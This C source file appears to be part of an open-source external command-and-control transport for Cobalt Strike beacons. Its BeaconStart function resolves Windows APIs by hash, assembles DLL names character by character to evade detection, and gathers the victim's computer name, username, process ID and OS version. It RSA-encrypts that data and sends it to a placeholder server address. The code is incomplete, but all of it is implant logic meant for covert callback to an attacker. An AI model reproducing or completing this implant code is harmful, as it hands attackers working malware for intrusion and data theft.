/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * BeaconStart
 *
 * Purpose:
 *
 * Implements the initial connection back
 * to the TeamServer. Then starts the IO
 * loop.
 *
 * The I-TLV configuration header must be
 * passed in as a parameter.
 *
-*/
DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
{
	BEACON_INSTANCE Ins           = { 0 };
	UCHAR           Str[MAX_PATH] = { 0 };
	PVOID           K32           =   0;
	PVOID           Ntl           =   0;
	PVOID           Ptr           =   0;

	K32 = PebGetModule( H_KERNEL32 );
	Ntl = PebGetModule( H_NTDLL );

	if ( K32 != NULL && Ntl != NULL ) 
	{
		Ins.api.wcslen              = PeGetFuncEat( Ntl, H_WCSLEN );
		Ins.api.GetACP              = PeGetFuncEat( K32, H_GETACP );
		Ins.api.wcsrchr             = PeGetFuncEat( Ntl, H_WCSRCHR );
		Ins.api.wcstombs            = PeGetFuncEat( Ntl, H_WCSTOMBS );
		Ins.api.GetOEMCP            = PeGetFuncEat( K32, H_GETOEMCP );
		Ins.api.LocalLock           = PeGetFuncEat( K32, H_LOCALLOCK );
		Ins.api.LocalFree           = PeGetFuncEat( K32, H_LOCALFREE );
		Ins.api.LocalSize           = PeGetFuncEat( K32, H_LOCALSIZE );
		Ins.api.LocalAlloc          = PeGetFuncEat( K32, H_LOCALALLOC );
		Ins.api.CloseHandle         = PeGetFuncEat( K32, H_CLOSEHANDLE );
		Ins.api.FreeLibrary         = PeGetFuncEat( K32, H_FREELIBRARY );
		Ins.api.LocalUnlock         = PeGetFuncEat( K32, H_LOCALUNLOCK );
		Ins.api.RtlRandomEx         = PeGetFuncEat( Ntl, H_RTLRANDOMEX );
		Ins.api.LocalReAlloc        = PeGetFuncEat( K32, H_LOCALREALLOC );
		Ins.api.LoadLibraryA        = PeGetFuncEat( K32, H_LOADLIBRARYA );
		Ins.api.GetTickCount        = PeGetFuncEat( K32, H_GETTICKCOUNT );
		Ins.api.GetComputerNameA    = PeGetFuncEat( K32, H_GETCOMPUTERNAMEA );
		Ins.api.GetCurrentProcessId = PeGetFuncEat( K32, H_GETCURRENTPROCESSID );

		Str[0x0] = 'c';
		Str[0x1] = 'r';
		Str[0x2] = 'y';
		Str[0x3] = 'p';
		Str[0x4] = 't';
		Str[0x5] = '3';
		Str[0x6] = '2';
		Str[0x7] = '.';
		Str[0x8] = 'd';
		Str[0x9] = 'l';
		Str[0xa] = 'l';
		Str[0xb] = 0x0;

		Ins.Module[0] = Ins.api.LoadLibraryA( CPTR( Str ) );
		Ins.api.CryptDecodeObjectEx      = PeGetFuncEat( Ins.Module[0], H_CRYPTDECODEOBJECTEX );
		Ins.api.CryptImportPublicKeyInfo = PeGetFuncEat( Ins.Module[0], H_CRYPTIMPORTPUBLICKEYINFO );

		Str[0x0] = 'a';
		Str[0x1] = 'd';
		Str[0x2] = 'v';
		Str[0x3] = 'a';
		Str[0x4] = 'p';
		Str[0x5] = 'i';
		Str[0x6] = '3';
		Str[0x7] = '2';
		Str[0x8] = '.';
		Str[0x9] = 'd';
		Str[0xa] = 'l';
		Str[0xb] = 'l';
		Str[0xc] = 0x0;

		Ins.Module[1] = Ins.api.LoadLibraryA( CPTR( Str ) );
		Ins.api.CryptDecrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTDECRYPT );
		Ins.api.CryptEncrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTENCRYPT );
		Ins.api.CryptHashData        = PeGetFuncEat( Ins.Module[1], H_CRYPTHASHDATA );
		Ins.api.CryptGenRandom       = PeGetFuncEat( Ins.Module[1], H_CRYPTGENRANDOM );
		Ins.api.CryptImportKey       = PeGetFuncEat( Ins.Module[1], H_CRYPTIMPORTKEY );
		Ins.api.CryptCreateHash      = PeGetFuncEat( Ins.Module[1], H_CRYPTCREATEHASH );
		Ins.api.CryptDestroyKey      = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYKEY );
		Ins.api.OpenThreadToken      = PeGetFuncEat( Ins.Module[1], H_OPENTHREADTOKEN );
		Ins.api.OpenProcessToken     = PeGetFuncEat( Ins.Module[1], H_OPENPROCESSTOKEN );
		Ins.api.CryptDestroyHash     = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYHASH );
		Ins.api.CryptSetKeyParam     = PeGetFuncEat( Ins.Module[1], H_CRYPTSETKEYPARAM );
		Ins.api.CryptGetHashParam    = PeGetFuncEat( Ins.Module[1], H_CRYPTGETHASHPARAM );
		Ins.api.LookupAccountSidA    = PeGetFuncEat( Ins.Module[1], H_LOOKUPACCOUNTSIDA );
		Ins.api.CryptReleaseContext  = PeGetFuncEat( Ins.Module[1], H_CRYPTRELEASECONTEXT );
		Ins.api.GetTokenInformation  = PeGetFuncEat( Ins.Module[1], H_GETTOKENINFORMATION );
		Ins.api.CryptAcquireContextA = PeGetFuncEat( Ins.Module[1], H_CRYPTACQUIRECONTEXTA );

		Str[0x0] = 'w';
		Str[0x1] = 's';
		Str[0x2] = '2';
		Str[0x3] = '_';
		Str[0x4] = '3';
		Str[0x5] = '2';
		Str[0x6] = '.';
		Str[0x7] = 'd';
		Str[0x8] = 'l';
		Str[0x9] = 'l';
		Str[0xa] = 0x0;

		Ins.Module[2] = Ins.api.LoadLibraryA( CPTR( Str ) );
		Ins.api.send        = PeGetFuncEat( Ins.Module[2], H_SEND );
		Ins.api.WSAStartup  = PeGetFuncEat( Ins.Module[2], H_WSASTARTUP );
		Ins.api.WSAConnect  = PeGetFuncEat( Ins.Module[2], H_WSACONNECT );
		Ins.api.WSACleanup  = PeGetFuncEat( Ins.Module[2], H_WSACLEANUP );
		Ins.api.WSASocketA  = PeGetFuncEat( Ins.Module[2], H_WSASOCKETA );
		Ins.api.closesocket = PeGetFuncEat( Ins.Module[2], H_CLOSESOCKET );

		if ( Ins.api.CryptDecodeObjectEx( 
				X509_ASN_ENCODING, 
				X509_PUBLIC_KEY_INFO, 
				Key,
				Len,
				CRYPT_DECODE_ALLOC_FLAG,
				NULL,
				&Ins.key[0].Ptr,
				&Ins.key[0].Len
				))
		{
			if ( CryptRsaInit( &Ins ) )
			{
				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Str ) )
				{
					if ((Ins.BeaconId = RandomNumber32( &Ins )) != 0)
					{
						PBEACON_METADATA_HDR Met = 0;
						PBEACON_METADATA_HDR Hdr = 0;
						struct sockaddr_in   Sin = { 0 };
						PVOID                Ecp = 0;
						PVOID                Cmp = 0;
						PVOID                Usr = 0;
						PVOID                Exe = 0;
						ULONG                Ecl = 0;

						if ((Cmp = BeaconComputer( &Ins )))
						{
							if ((Usr = BeaconUsername( &Ins )))
							{
								if ((Exe = BeaconProcess( &Ins )))
								{
									//
									// Start checking the return value,
									// and free the old buffer if it
									// fails.
									//

									Met = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ) );
									Met = BufferAddRaw( &Ins, Met, Str, 16 );
									Met = BufferAddUI2( &Ins, Met, HTONS( Ins.api.GetACP() ) );
									Met = BufferAddUI2( &Ins, Met, HTONS( Ins.api.GetOEMCP() ) );
									Met = BufferAddUI4( &Ins, Met, HTONL( Ins.BeaconId ) );
									Met = BufferAddUI4( &Ins, Met, HTONL( Ins.api.GetCurrentProcessId() ) );
									Met = BufferAddUI2( &Ins, Met, 0 );
									
									//
									// Instead of manually defining the 
									// flags, make sure to check if we
									// are ADMIN or SYSTEM.
									//

									Met = BufferAddUI1( &Ins, Met, 2 );
									Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion );
									Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion );
									Met = BufferAddUI2( &Ins, Met, HTONS( NtCurrentTeb()->ProcessEnvironmentBlock->OSBuildNumber ) );
									Met = BufferAddUI4( &Ins, Met, 0x0 );
									Met = BufferAddUI4( &Ins, Met, 0x0 );
									Met = BufferAddUI4( &Ins, Met, 0x0 );
									Met = BufferAddUI4( &Ins, Met, 0x0 );
									Met = BufferAddRaw( &Ins, Met, Cmp, strlen( Cmp ) );
									Met = BufferAddUI1( &Ins, Met, '\t' );
									Met = BufferAddRaw( &Ins, Met, Usr, strlen( Usr ) );
									Met = BufferAddUI1( &Ins, Met, '\t' );

									//
									// Fix code to extract ANSI EXE 
									// name from ProcessParameters.
									//

									Met = BufferAddUI1( &Ins, Met, 'h'  );
									Met = BufferAddUI1( &Ins, Met, 'i'  );
									Met = BufferAddUI1( &Ins, Met, '.'  );
									Met = BufferAddUI1( &Ins, Met, 'e'  );
									Met = BufferAddUI1( &Ins, Met, 'x'  );
									Met = BufferAddUI1( &Ins, Met, 'e'  );
									Met = BufferAddUI1( &Ins, Met, '\0' );

									if ((Hdr = Ins.api.LocalLock( Met )))
									{
										Hdr->uMagic = BEACON_METADATA_MAGIC;
										Hdr->Length = Ins.api.LocalSize( Met ) - 8;

										if ( CryptRsaEncrypt( &Ins, Hdr, Hdr->Length + 8, &Ecp, &Ecl ))
										{
											//
											// NOTE:
											//
											// Merge connect with init to reduce the
											// size, and move the sinaddr_in struct.
											//

											if ( TransportInit( &Ins ) )
											{
												Sin.sin_family      = AF_INET;
												Sin.sin_port        = 0x4242;
												Sin.sin_addr.s_addr = 0x43434343;

												if ( TransportConnect( &Ins, Sin ) )
												{
													if ( TransportSend( &Ins, Ecp, Ecl ) )
													{

													};
												};
												TransportFree( &Ins );
											};
											Ins.api.LocalFree( Ecp );
										};
										Ins.api.LocalUnlock( Met );
									};
									Ins.api.LocalFree( Exe );

									// MOVE THIS
									Ins.api.LocalFree( Met );
								};
								Ins.api.LocalFree( Usr );
							};
							Ins.api.LocalFree( Cmp );
						};
					};
				};
				CryptRsaFree( &Ins );
			};
			Ins.api.LocalFree( Ins.key[0].Ptr );
		};

		//
		// If we are active, start the IO loop.
		// Need the AES functions finished, as
		// well as the HMAC code.
		//

		if ( Ins.Module[2] != NULL )
			Ins.api.FreeLibrary( Ins.Module[2] );

		if ( Ins.Module[1] != NULL )
			Ins.api.FreeLibrary( Ins.Module[1] );

		if ( Ins.Module[0] != NULL )
			Ins.api.FreeLibrary( Ins.Module[0] );
	};

	__builtin_memset( &Ins, 0, sizeof( Ins ) );

	return;
};
